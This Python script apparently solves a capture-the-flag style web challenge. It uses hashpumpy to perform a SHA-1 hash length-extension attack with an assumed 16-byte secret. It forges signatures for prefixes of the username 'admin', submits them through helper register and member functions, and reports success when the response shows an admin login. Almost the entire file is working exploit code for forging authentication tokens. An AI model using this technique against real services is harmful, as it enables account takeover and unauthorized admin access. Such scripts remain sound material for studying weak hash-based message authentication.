# hello
from os import stat
import hashpumpy
import urllib.parse
import string
import chardet

from functions import stick_register, stick_login, stick_member

# PROVEN KEY LENGTH IS 16 (128 bits)
KEY_LEN = 16

import random
domains = [ "hotmail.com", "gmail.com", "aol.com", "mail.com" , "mail.kz", "yahoo.com"]
letters = string.ascii_lowercase[:12]

def get_random_domain(domains):
    return random.choice(domains)

def get_random_name(letters, length):
    return ''.join(random.choice(letters) for _ in range(length))

def generate_random_emails(nb, length):
    return [get_random_name(letters, length) + '%40' + get_random_domain(domains) for _ in range(nb)]

def main():
    # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
    results = []

    username = "admin"
    hashes = [
        'f84807ab39ce9a91362fd07dc92ebfe9f93550e9', # a
        '61fc13a44575a868bc1a33ea3ddbdc6c70815f8e', # ad
        'cf0b865de23ec929ac6112edf0eb90d3c5a32107', # adm
        '4dd28ad0560441245de6fda3973890eeb41b702d', # admi
    ]
    for i in range(1, 4):
        data = list(hashpumpy.hashpump(hashes[i-1], username[:i], username[i:], KEY_LEN))
        data.append(i)
        data.append(username[:i])
        data.append(username[i:])
        results.append(data)

    print(results)

    for r in results:
        register_user = urllib.parse.quote_from_bytes(r[1])
        print("[{}] {} => {}".format(r[2], r[0], register_user))
        print(register_user)

        status, data = stick_member(register_user, r[0], prefix=r[3])
        

        print("[{}] Code: {}".format(r[2], status))
        if status == 200:
            resp = ''
            try:
                resp = data.getvalue()
                resp = resp.decode('latin-1')
                if resp.find('Missing') > 0:
                    print("[{}] KO: Missing fields".format(r[2]))
                    break 
                elif resp.find('Invalid') > 0: 
                    print("[{}] KO: Invalid fields".format(r[2]))
                    break
                elif resp.find('User exist') > 0:
                    print("[{}] KO: User exist, try with another email".format(r[2]))
                    break
                elif resp.find('Registered !') > 0:
                    print("[{}] OK: Registered".format(r[2]))
                elif resp.find('Welcome') > 0:
                    print("[{}] OK: Logged as Admin".format(r[2]))
                    print(resp)
                    break
                elif resp.find('email or password empty'):
                    print("[{}] KO: Hash doesn't work".format(r[2]))
                else:
                    print(resp)
            except Exception as exc:
                print("[{}] KO: body length {} => {}".format(r[2], len(resp), exc))
                print(resp.decode('latin-1'))

if __name__ == "__main__":
    main()